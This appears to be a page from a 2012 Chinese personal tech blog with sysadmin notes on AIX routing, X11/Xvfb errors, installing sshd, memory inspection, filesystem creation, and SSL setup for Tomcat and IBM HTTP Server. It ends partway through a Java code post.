<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ifconfig -a</span><br><span class="line">en0:10.13.135.31</span><br><span class="line">en1:10.13.135.81</span><br><span class="line"></span><br><span class="line">route add 10.13.136.237 10.13.135.65 -if en1</span><br><span class="line">route delete 10.13.136.237 10.13.135.65</span><br><span class="line">ping 10.13.136.237</span><br><span class="line">traceroute -r -s 10.13.135.81 10.13.136.237</span><br><span class="line">netstat -r traceroute 10.13.136.237</span><br></pre></td></tr></table></figure>

<p> 删除不用的默认gateway<br><code>route delete default 10.13.135.1</code></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Crystal-Clear出现Could-not-initialize-class-sun.a..." class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2012-06-01T03:08:05.000Z"><a href="/2012/06/01/Crystal-Clear%E5%87%BA%E7%8E%B0Could-not-initialize-class-sun.a.../">2012-06-01</a></time>
      
      
  
    <h1 class="title"><a href="/2012/06/01/Crystal-Clear%E5%87%BA%E7%8E%B0Could-not-initialize-class-sun.a.../">Crystal Clear出现Could not initialize class sun.awt.X11GraphicsEnvironment</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <p>系统使用Websphere 5，相应的jdk是1.3，所以无法使用headless模式-Djava.awt.headless&#x3D;true解决这个问题。</p>
<p>在jdk1.3下的有几个比较重要的步骤：</p>
<ol>
<li>出现java.lang.NoClassDefFoundError: sun&#x2F;awt&#x2F;X11GraphicsEnvironment</li>
</ol>
<p>用export DISPLAY&#x3D;:100</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;machine name&gt;:&lt;server number&gt;.&lt;screen number&gt;</span><br><span class="line">&lt;machine name&gt;默认是localhost</span><br><span class="line">&lt;screen number&gt;&gt;默认是0</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><p>如果上述步骤后出现Can’t connect to X11 window server using ‘:100’ as the value of the DISPLAY variable.<br>用xhost+local machine name<br>当然最简单是xhost+，这样可以让所有机器访问这台服务器</p>
</li>
<li><p>之前遇到的问题使用上述两个步骤就可以解决了，但有个前提是已经安装了Xvfb(Virtual X11 Frame Buffer)，使用命令<br><code>ps -ef|grep X</code></p>
</li>
</ol>
<p>AIX显示结果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root   3420   5236   0   Jan 03      -  5:02 /usr/lpp/X11/bin/X -x abx -x dbe -x GLX -D /usr/lib/X11//rgb -T -force :0 -auth /var/dt/A:0-SVfhqa</span><br><span class="line">root  25812      1 120   Jan 03      - 32714:55 /usr/bin/X11/X -force -vfb -x abx -x dbe -x GLX :100</span><br></pre></td></tr></table></figure>

<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p><a target="_blank" rel="noopener" href="http://www.websina.com/bugzero/faq/exception-x11.html">http://www.websina.com/bugzero/faq/exception-x11.html</a><br><a target="_blank" rel="noopener" href="http://download.oracle.com/otn_hosted_doc/jdeveloper/904preview/uixhelp/uixdevguide/xserver.html">http://download.oracle.com/otn_hosted_doc/jdeveloper/904preview/uixhelp/uixdevguide/xserver.html</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-在AIX上安装ssh" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2012-05-31T08:54:06.000Z"><a href="/2012/05/31/%E5%9C%A8AIX%E4%B8%8A%E5%AE%89%E8%A3%85ssh/">2012-05-31</a></time>
      
      
  
    <h1 class="title"><a href="/2012/05/31/%E5%9C%A8AIX%E4%B8%8A%E5%AE%89%E8%A3%85ssh/">在AIX上安装ssh</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <p>由于没有办法在AIX 5.2上使用smitty install_all openssh，因为安装完后调用ssh命令出现error，只有在一台当年已经安装了ssh的机器上copy过来，另外由于不想再&#x2F;usr&#x2F;local上安装这个ssh，在&#x2F;tmp上安装这个ssh了。</p>
<ol>
<li><p>使用nfs搭桥到装有ssh的机器。</p>
</li>
<li><p>Copy files</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">copy -rp /usr/local/sbin/sshd /tmp/xx/ssh/sbin</span><br><span class="line">copy -rp /usr/local/bin  /tmp/xx/ssh/</span><br><span class="line">copy -rp /usr/local/etc  /tmp/xx/ssh/</span><br></pre></td></tr></table></figure>
</li>
<li><p>创建子系统</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkssys -s sshd -p /tmp/xx/ssh/sbin/sshd -a &quot;-D -f /tmp/xx/ssh/etc/sshd_config&quot; -u 0 -e /dev/console -i /dev/console -o /dev/console -R -Q -S -f 9 -n 15 -E 20 -G ssh -d -w 20</span><br><span class="line">lssrc -S -s sshd (check it exists)</span><br></pre></td></tr></table></figure>

<p>如果有什么改动，可以<br><code>chssys -s sshd -a &quot;-D -f /tmp/xx/ssh/etc/sshd_config&quot;</code></p>
</li>
<li><p>由于系统没有sshd用户，所以启动时候有些错误，可以增加sshd用户，或者在sshd_config中将<br><code>UsePrivilegeSeparation no</code></p>
</li>
<li><p>和修改key的路径</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HostKey /tmp/xx/ssh/etc/ssh_host_rsa_key</span><br><span class="line">HostKey /tmp/xx/ssh/etc/ssh_host_dsa_key</span><br><span class="line">HostKey /tmp/xx/ssh/etc/ssh_host_ecdsa_key</span><br></pre></td></tr></table></figure></li>
<li><p>启动sshd，startsrc -g ssh</p>
</li>
</ol>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="http://www.ibm.com/developerworks/forums/thread.jspa?threadID=249556">http://www.ibm.com/developerworks/forums/thread.jspa?threadID=249556</a><br><a target="_blank" rel="noopener" href="http://daning.iteye.com/blog/166186">http://daning.iteye.com/blog/166186</a><br><a target="_blank" rel="noopener" href="http://unix.ittoolbox.com/groups/technical-functional/ibm-aix-l/sshd-daemon-does-not-start-during-boot-1524597">http://unix.ittoolbox.com/groups/technical-functional/ibm-aix-l/sshd-daemon-does-not-start-during-boot-1524597</a><br><a target="_blank" rel="noopener" href="http://unix.ittoolbox.com/groups/technical-functional/ibm-aix-l/how-to-restart-ssh-in-aix-1551784">http://unix.ittoolbox.com/groups/technical-functional/ibm-aix-l/how-to-restart-ssh-in-aix-1551784</a><br><a target="_blank" rel="noopener" href="http://www.unixguide.net/sun/ssh_installation.shtml">http://www.unixguide.net/sun/ssh_installation.shtml</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-aix-memory-tuning" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2012-05-29T09:38:56.000Z"><a href="/2012/05/29/aix-memory-tuning/">2012-05-29</a></time>
      
      
  
    <h1 class="title"><a href="/2012/05/29/aix-memory-tuning/">aix memory tuning</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="真实内存数量"><a href="#真实内存数量" class="headerlink" title="真实内存数量"></a>真实内存数量</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">lsattr -El sys0 -a realmem（以KB为单位） </span><br><span class="line">bootinfo -r（以KB为单位） </span><br><span class="line"></span><br><span class="line">prtconf -m（以MB为单位） </span><br><span class="line">bootinfo -y -&gt;cpu </span><br><span class="line">bootinfo -K -&gt;kernel </span><br><span class="line"></span><br><span class="line">svmon -G 第一行memory size（需要X4KB) </span><br><span class="line">vmstat -v/-s 第一行memory page（需要X4KB) </span><br><span class="line">topas </span><br><span class="line"></span><br><span class="line">lsps -a/-s </span><br><span class="line">vmo -L/-a </span><br><span class="line"> </span><br><span class="line">prtconf -v/lscfg </span><br><span class="line">lsdev -Cc tape/processor/adapter/disk</span><br><span class="line">prtconf = lsconf</span><br><span class="line"></span><br><span class="line">ps -efa 显示进程 </span><br><span class="line">ps aux 显示进程内存情况 </span><br></pre></td></tr></table></figure>

<p>  file pages, minperm, maxperm, numperm关于文件页面占用内存，跟non-computational内存有关(topas) </p>
<p>  client pages,maxclient,numclient关于nfs被client连接使用内存有关 </p>
<p>  数据库服务器由于是计算密集型，所以minperm, maxperm percentage可以设置小一些，而文件服务器可以设置大一些的。 </p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-https的一些配置" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2012-05-23T01:18:59.000Z"><a href="/2012/05/23/https%E7%9A%84%E4%B8%80%E4%BA%9B%E9%85%8D%E7%BD%AE/">2012-05-23</a></time>
      
      
  
    <h1 class="title"><a href="/2012/05/23/https%E7%9A%84%E4%B8%80%E4%BA%9B%E9%85%8D%E7%BD%AE/">https的一些配置</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><p>tunein<br>sky.fm<br>browser import cert<br>ssl in archlinux<br>ssl in tomcat</p>
<h3 id="Openssl"><a href="#Openssl" class="headerlink" title="Openssl"></a>Openssl</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">openssl test https</span><br><span class="line">openssl s_client -showcerts -connect 10.13.139.102:443 -state -debug</span><br><span class="line">openssl s_client -connect 10.13.139.102:465</span><br><span class="line"></span><br><span class="line">OpenSSL Command-Line HOWTO</span><br><span class="line">http://www.madboa.com/geek/openssl/(中文版http://www.linuxfly.org/post/185/1/4/)</span><br></pre></td></tr></table></figure>

<h3 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">keytool -genkey -alias developerstation -keyalg RSA -keystore developerstation.keystore -keysize 2048</span><br><span class="line"></span><br><span class="line">&lt;Connector port=&quot;8443&quot; protocol=&quot;HTTP/1.1&quot; SSLEnabled=&quot;true&quot;</span><br><span class="line">               maxThreads=&quot;150&quot; scheme=&quot;https&quot; secure=&quot;true&quot;</span><br><span class="line">               clientAuth=&quot;false&quot; sslProtocol=&quot;TLS&quot; keystoreFile=&quot;C:\Software\Tomcat\conf\developerstation.keystore&quot; keystorePass=&quot;password&quot;/&gt;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="http://developerstation.sinaapp.com/2012/03/27/tomcat7%E4%B8%AD%E9%85%8D%E7%BD%AEssl%E7%9A%84%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4%E5%8F%8C%E5%90%91%E8%AE%A4%E8%AF%81/">tomcat7中配置ssl的详细步骤(双向认证)</a></p>
<p><a target="_blank" rel="noopener" href="http://developerstation.sinaapp.com/2012/03/22/tomcat7%E4%B8%AD%E9%85%8D%E7%BD%AEssl%E7%9A%84%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4/">tomcat7中配置ssl的详细步骤(单向认证)</a></p>
<h3 id="IHS"><a href="#IHS" class="headerlink" title="IHS"></a>IHS</h3><p>例子</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Listen 10.13.139.102:443</span><br><span class="line">&lt;VirtualHost 10.13.139.102:443&gt;</span><br><span class="line">   SSLEnable</span><br><span class="line">   SSLClientAuth none</span><br><span class="line">   Keyfile C:\temp\ssl\key.kdb</span><br><span class="line">   SSLV2Timeout 100</span><br><span class="line">   SSLV3Timeout 1000</span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line">SSLDisable</span><br></pre></td></tr></table></figure>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference:"></a>Reference:</h3><p><a target="_blank" rel="noopener" href="http://www-01.ibm.com/support/docview.wss?uid=swg21179559">Guide to properly setting up SSL within the IBM HTTP Server</a><br><a target="_blank" rel="noopener" href="http://www.blogjava.net/fastzch/archive/2007/08/03/134292.html">在IHS上配置SSL</a><br><a target="_blank" rel="noopener" href="http://publib.boulder.ibm.com/infocenter/ltscnnct/v2r0/index.jsp?topic=/com.ibm.lc_2.0_IC/t_configure_ihs.html">Configuring the IBM HTTP Server for SSL</a><br><a target="_blank" rel="noopener" href="http://www-01.ibm.com/software/webservers/httpservers/doc/v1319/9acdssl.htm#sslen">SSL Directives</a><br><a target="_blank" rel="noopener" href="http://prefetch.net/articles/debuggingssl.html">Debugging SSL communications</a></p>
<h3 id="IKEYMAN生成证书"><a href="#IKEYMAN生成证书" class="headerlink" title="IKEYMAN生成证书"></a>IKEYMAN生成证书</h3><p>例子</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&quot;C:\Program Files\IBM\gsk5\bin\gsk5cmd.exe&quot; -keydb -create -db xx.kdb -pw password -type cms -expire 60 -stash</span><br><span class="line">&quot;C:\Program Files\IBM\gsk5\bin\gsk5cmd.exe&quot; -cert -create -db xx.kdb -pw password -size 1024 -dn &quot;CN=weblinux.raleigh.ibm.com,O=IBM,OU=IBM HTTP Server,L=RTP,ST=NC,C=US&quot; -label mylabel -default_cert yes</span><br><span class="line">&quot;C:\Program Files\IBM\gsk5\bin\gsk5cmd.exe&quot; -cert -list -db xx.kdb -pw password</span><br><span class="line">&quot;C:\Program Files\IBM\gsk5\bin\gsk5cmd.exe&quot; -cert -details -db xx.kdb -pw password -label mylabel</span><br><span class="line">&quot;C:\Program Files\IBM\gsk5\bin\gsk5cmd.exe&quot; -cert -extract -db xx.kdb -pw password -label mylabel -format ascii -target forest-certficate</span><br><span class="line">&quot;C:\Program Files\IBM\gsk5\bin\gsk5cmd.exe&quot; -cert -export -db xx.kdb -pw password -label mylabel -target forest.p12 -target_pw password -target_type pkcs12 -encryption strong</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="http://www-01.ibm.com/support/docview.wss?rs=177&context=SSEQTJ&uid=swg21006430">Using iKeyman to create a key database file</a><br><a target="_blank" rel="noopener" href="http://www-01.ibm.com/software/webservers/httpservers/doc/v2047/manual/ibm/en_US/9atikeyu.htm">Using the Key Management Utility</a><br><a target="_blank" rel="noopener" href="http://www-01.ibm.com/software/webservers/httpservers/doc/v1312/ibm/2tabcontents.htm">httpservers doc</a><br><a target="_blank" rel="noopener" href="http://publib.boulder.ibm.com/infocenter/pcomhelp/v5r9/index.jsp?topic=/com.ibm.pcomm.doc/books/html/admin_guide13.htm">ikeycmd参考</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-在AIX上空闲卷上重建文件系统" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2012-05-11T07:37:06.000Z"><a href="/2012/05/11/%E5%9C%A8AIX%E4%B8%8A%E7%A9%BA%E9%97%B2%E5%8D%B7%E4%B8%8A%E9%87%8D%E5%BB%BA%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/">2012-05-11</a></time>
      
      
  
    <h1 class="title"><a href="/2012/05/11/%E5%9C%A8AIX%E4%B8%8A%E7%A9%BA%E9%97%B2%E5%8D%B7%E4%B8%8A%E9%87%8D%E5%BB%BA%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/">在AIX上空闲卷上重建文件系统</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h3 id="在卷组vg01上重建具有5个物理分区的逻辑卷，卷名为mytest，类型jfs2（一个物理分区大小为128或512M，具体用命令lsvg-vg01查看PP-Size）"><a href="#在卷组vg01上重建具有5个物理分区的逻辑卷，卷名为mytest，类型jfs2（一个物理分区大小为128或512M，具体用命令lsvg-vg01查看PP-Size）" class="headerlink" title="在卷组vg01上重建具有5个物理分区的逻辑卷，卷名为mytest，类型jfs2（一个物理分区大小为128或512M，具体用命令lsvg vg01查看PP Size）"></a>在卷组vg01上重建具有5个物理分区的逻辑卷，卷名为mytest，类型jfs2（一个物理分区大小为128或512M，具体用命令lsvg vg01查看PP Size）</h3><p>  <code>mklv -y mytest -t jfs2 vg01 5</code></p>
<h3 id="在逻辑卷mytest上重建可读写的jfs2文件系统，并新建挂载文件夹-x2F-mounttest"><a href="#在逻辑卷mytest上重建可读写的jfs2文件系统，并新建挂载文件夹-x2F-mounttest" class="headerlink" title="在逻辑卷mytest上重建可读写的jfs2文件系统，并新建挂载文件夹&#x2F;mounttest"></a>在逻辑卷mytest上重建可读写的jfs2文件系统，并新建挂载文件夹&#x2F;mounttest</h3><p>  <code>crfs -v jfs2 -d mytest -p rw -m /mounttest</code></p>
<h3 id="查看逻辑卷："><a href="#查看逻辑卷：" class="headerlink" title="查看逻辑卷："></a>查看逻辑卷：</h3><p>  <code>lslv mytest</code><br>  <code>lsvg -l vg01</code></p>
<h3 id="查看-x2F-etc-x2F-filesystems文件，看到"><a href="#查看-x2F-etc-x2F-filesystems文件，看到" class="headerlink" title="查看&#x2F;etc&#x2F;filesystems文件，看到"></a>查看&#x2F;etc&#x2F;filesystems文件，看到</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/mounttest:</span><br><span class="line">  dev             = /dev/mytest</span><br><span class="line">  vfs             = jfs2</span><br><span class="line">  log             = /dev/loglv04</span><br><span class="line">  mount           = false</span><br><span class="line">  options         = rw</span><br><span class="line">  account         = false</span><br></pre></td></tr></table></figure>

<h3 id="此时mytest的LV-STATE为closed-x2F-syncd，直到将其挂载到-x2F-mounttest才能使用。"><a href="#此时mytest的LV-STATE为closed-x2F-syncd，直到将其挂载到-x2F-mounttest才能使用。" class="headerlink" title="此时mytest的LV STATE为closed&#x2F;syncd，直到将其挂载到&#x2F;mounttest才能使用。"></a>此时mytest的LV STATE为closed&#x2F;syncd，直到将其挂载到&#x2F;mounttest才能使用。</h3><p>  <code>mount /dev/mytest /mounttest</code></p>
<h3 id="用lsvg-l-vg01看LV-STATE转为open-x2F-syncd"><a href="#用lsvg-l-vg01看LV-STATE转为open-x2F-syncd" class="headerlink" title="用lsvg -l vg01看LV STATE转为open&#x2F;syncd"></a>用lsvg -l vg01看LV STATE转为open&#x2F;syncd</h3><h3 id="查看文件系统：df-g，看到-x2F-mounttest已挂载。"><a href="#查看文件系统：df-g，看到-x2F-mounttest已挂载。" class="headerlink" title="查看文件系统：df -g，看到&#x2F;mounttest已挂载。"></a>查看文件系统：df -g，看到&#x2F;mounttest已挂载。</h3><h3 id="卸载文件系统"><a href="#卸载文件系统" class="headerlink" title="卸载文件系统:"></a>卸载文件系统:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">umount /mounttest (LV STATE转为closed/syncd)</span><br><span class="line">rmfs /mounttest</span><br><span class="line">rmlv loglv04</span><br></pre></td></tr></table></figure>

<h3 id="有以下这些概念需要注意："><a href="#有以下这些概念需要注意：" class="headerlink" title="有以下这些概念需要注意："></a>有以下这些概念需要注意：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vg_name</span><br><span class="line">pv_name</span><br><span class="line">lv_name</span><br><span class="line">mountpoint</span><br><span class="line">vg01</span><br><span class="line">hdisk0</span><br><span class="line">mytest</span><br><span class="line">mountest</span><br></pre></td></tr></table></figure>

<h3 id="找出一个物理卷可用到空间：lspv-p-hdisk1，找到state显示free的部分。"><a href="#找出一个物理卷可用到空间：lspv-p-hdisk1，找到state显示free的部分。" class="headerlink" title="找出一个物理卷可用到空间：lspv -p hdisk1，找到state显示free的部分。"></a>找出一个物理卷可用到空间：lspv -p hdisk1，找到state显示free的部分。</h3><h3 id="了解以下命令有帮助："><a href="#了解以下命令有帮助：" class="headerlink" title="了解以下命令有帮助："></a>了解以下命令有帮助：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">lscfg</span><br><span class="line">prtconf</span><br><span class="line">lsdev -Cc hdisk</span><br><span class="line">lsattr -El hdisk0</span><br><span class="line">lsvg</span><br><span class="line">lspv</span><br><span class="line">lslv</span><br><span class="line">lsfs</span><br></pre></td></tr></table></figure>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference:"></a>Reference:</h3><p><a target="_blank" rel="noopener" href="http://study.chyangwa.com/IT/AIX/aixcmds1/crfs.htm">http://study.chyangwa.com/IT/AIX/aixcmds1/crfs.htm</a><br><a target="_blank" rel="noopener" href="http://www.tek-tips.com/faqs.cfm?fid=3180">http://www.tek-tips.com/faqs.cfm?fid=3180</a><br><a target="_blank" rel="noopener" href="http://www.ibm.com/developerworks/aix/library/au-dutta_cmds.html">http://www.ibm.com/developerworks/aix/library/au-dutta_cmds.html</a><br><a target="_blank" rel="noopener" href="http://www.cnblogs.com/Mainz/articles/1027105.html">http://www.cnblogs.com/Mainz/articles/1027105.html</a><br><a target="_blank" rel="noopener" href="http://blog.csdn.net/tglg/article/details/4557948">http://blog.csdn.net/tglg/article/details/4557948</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Sorting-&amp;-Cell-Merge,-commons-upload" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2012-04-19T05:50:31.000Z"><a href="/2012/04/19/Sorting-&-Cell-Merge,-commons-upload/">2012-04-19</a></time>
      
      
  
    <h1 class="title"><a href="/2012/04/19/Sorting-&-Cell-Merge,-commons-upload/">Sorting &amp; Cell Merge, commons-upload</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="LegalAdviceAction-java"><a href="#LegalAdviceAction-java" class="headerlink" title="LegalAdviceAction.java"></a>LegalAdviceAction.java</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span 